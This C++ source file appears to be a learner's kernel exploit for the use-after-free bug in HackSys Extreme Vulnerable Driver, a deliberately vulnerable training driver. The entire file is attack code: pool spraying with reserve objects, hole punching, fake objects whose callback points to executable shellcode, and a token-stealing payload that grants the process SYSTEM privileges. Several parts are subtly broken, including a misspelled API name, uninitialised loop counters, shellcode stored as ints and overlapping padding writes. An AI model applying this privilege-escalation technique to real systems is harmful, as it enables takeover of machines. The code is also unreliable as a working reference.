#include <iostream>
#include <windows.h>
#include <vector>

// IOCTL Definitions from HackSysExtremeVulnerableDriver.h
#define HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_USE_UAF_OBJECT                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT                 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_NEITHER, FILE_ANY_ACCESS)

// From Common.h
typedef void (*FunctionPointer)();

// USE_AFTER_FREE object from UseAfterFree.h
typedef struct _USE_AFTER_FREE {
        FunctionPointer Callback;
        CHAR Buffer[0x54];
    } USE_AFTER_FREE, *PUSE_AFTER_FREE;

// Type definition from tekwizz123
// Declaration of unicode string for object attributes
typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING;

// Type definition from tekwizz123
// Declaration of object attributes for usage in NtAllocateReserveObject
typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    UNICODE_STRING* ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES;

#define POBJECT_ATTRIBUTES OBJECT_ATTRIBUTES*

// Type definition from tekwizz123
// Basically declares a function pointer to the NtAllocateReserveObject
typedef NTSTATUS(WINAPI *_NtAllocateReserveObject)(
	OUT PHANDLE hObject,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN DWORD ObjectType);

std::pair<std::vector<HANDLE>, std::vector<HANDLE>> spray_pool(int objects_n){
    // Use a quarter of the spray to defragment the heap
    // Use the rest for sequential heap allocations
    int defrag_n = 0.2 * objects_n;
    int seq_n = objects_n - defrag_n;

    // Vectors storing the handles to all allocated objects
    std::vector<HANDLE> defrag_handles;
    std::vector<HANDLE> seq_handles;

    // Need to get address of the NtAllocateReserveObject from ntdll.dll
    _NtAllocateReserveObject NtAllocateReserveObject = (_NtAllocateReserveObject)
                                                        GetProcAddress(
                                                            GetModuleHandle(
                                                                "ntdll.dll"
                                                            ),
                                                            "NtAllocatedReserveObject");

    for (int i; i < defrag_n; i++){
        HANDLE handle = 0;
        // Allocate object, use 1 since we want to allocate the IoCompletionReserve object
        PHANDLE result = (PHANDLE)NtAllocateReserveObject((PHANDLE)&handle, NULL, 1);
        // Push handle to vector
        if (!result){
            defrag_handles.push_back(handle);
        }
    }

    for (int i; i < seq_n; i++){
        HANDLE handle = 0;
        // Allocate object, use 1 since we want to allocate the IoCompletionReserve object
        PHANDLE result = (PHANDLE)NtAllocateReserveObject((PHANDLE)&handle, NULL, 1);
        // Push handle to vector
        if (!result){
            seq_handles.push_back(handle);
        }
    }

    return std::make_pair(defrag_handles, seq_handles);
}

int main(int argc, char* argv[]){
    char devName[] = "\\\\.\\HackSysExtremeVulnerableDriver";
    DWORD inBuffSize = 1024;
    DWORD bytesRet = 0;
    BYTE* inBuffer = (BYTE*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, inBuffSize);
    RtlFillMemory(inBuffer, inBuffSize, 'A');

    std::cout << "Spraying the pool\n";

    // Spray the pool
    std::pair<std::vector<HANDLE>, std::vector<HANDLE>> handles = spray_pool(20000);

    // Create holes in the pool
    for (int i = 0; i < handles.second.size(); i++){
        if (i % 2){
            CloseHandle(handles.second[i]);
            handles.second[i] = NULL;
        }
    }

    std::cout << "Getting handle to driver";

    // Get a handle to the driver
    HANDLE dev = CreateFile(devName, GENERIC_READ | GENERIC_WRITE, 
                                NULL, NULL, OPEN_EXISTING, NULL, NULL);

    // Handle failure
    if (dev == INVALID_HANDLE_VALUE){
        std::cerr << "Could not get device handle" << std::endl;
        return 1;
    }

    std::cout << "Sending IOCTLs\n";

    std::cout << "Allocating UAF Object\n";

    // Allocate the UAF Object
    BOOL status = DeviceIoControl(dev, HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT,
                                    inBuffer, inBuffSize,
                                    NULL, 0, &bytesRet, NULL);

    std::cout << "Freeing UAF Object\n";

    // Free the UAF Object
    status = DeviceIoControl(dev, HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT,
                                    inBuffer, inBuffSize,
                                    NULL, 0, &bytesRet, NULL);
    
    // Shellcode from fuzzysecurity https://www.fuzzysecurity.com/tutorials/expDev/19.html
    // TODO: Write own shellcode?
    int payload[] = {                                     //---[Setup]
                        0x60,                               // pushad
                        0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, // mov eax, fs:[KTHREAD_OFFSET]
                        0x8B, 0x40, 0x50,                   // mov eax, [eax + EPROCESS_OFFSET]
                        0x89, 0xC1,                         // mov ecx, eax (Current _EPROCESS structure)
                        0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00, // mov ebx, [eax + TOKEN_OFFSET]
                                                            // ---[Copy System PID token]
                        0xBA, 0x04, 0x00, 0x00, 0x00,       // mov edx, 4 (SYSTEM PID)
                        0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, // mov eax, [eax + FLINK_OFFSET] <-|
                        0x2D, 0xB8, 0x00, 0x00, 0x00,       // sub eax, FLINK_OFFSET           |
                        0x39, 0x90, 0xB4, 0x00, 0x00, 0x00, // cmp [eax + PID_OFFSET], edx     |
                        0x75, 0xED,                         // jnz                           ->|
                        0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00, // mov edx, [eax + TOKEN_OFFSET]
                        0x89, 0x91, 0xF8, 0x00, 0x00, 0x00, // mov [ecx + TOKEN_OFFSET], edx
                                                            //---[Recover]
                        0x61,                               // popad
                        0xC3                                // ret
                        };

    // Set up payload buffer
    DWORD payloadSize = sizeof(payload);
    LPVOID payloadAddr = VirtualAlloc(NULL, payloadSize,
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_EXECUTE_READWRITE);
    memcpy(payloadAddr, payload, payloadSize);

    std::cout << "Payload adddress is: " << payloadAddr << '\n';

    // Must set up the structure of the fake object so that
    // it matches the structure of the UAF Object
    DWORD totalObjectSize = 0x60;
    BYTE* payloadBuffer = (BYTE*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, totalObjectSize);
    // Set the first 4 bytes to be the address to the payload function
    memcpy(payloadBuffer, (LPVOID) &payloadAddr, 4);
    // Set the following bytes of the buffer to 'A'
    char padding[0x58 - 0x04] = {'A'};
    char padding2[8] = {'\0'};
    memcpy(payloadBuffer+4, (LPVOID) padding, 0x58-0x04);
    // Add a remaining 8 bits to fill the 0x60 sized gap
    memcpy(payloadBuffer + 0x57, (LPVOID) padding2, 8);

    std::cout << "Allocating fake objects\n";

    // Fill gaps with Fake Objects
    for (int i = 0; i < handles.second.size() / 2; i++){
        status = DeviceIoControl(dev, HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT,
                                    payloadBuffer, totalObjectSize, NULL, 
                                    0, &bytesRet, NULL);
    }

    std::cout << "Using UAF Object after free\n";

    // Use the UAF Object after Free
    status = DeviceIoControl(dev, HACKSYS_EVD_IOCTL_USE_UAF_OBJECT,
                                    inBuffer, inBuffSize,
                                    NULL, 0, &bytesRet, NULL);

    // Close device
    CloseHandle(dev);
    return 0;
}
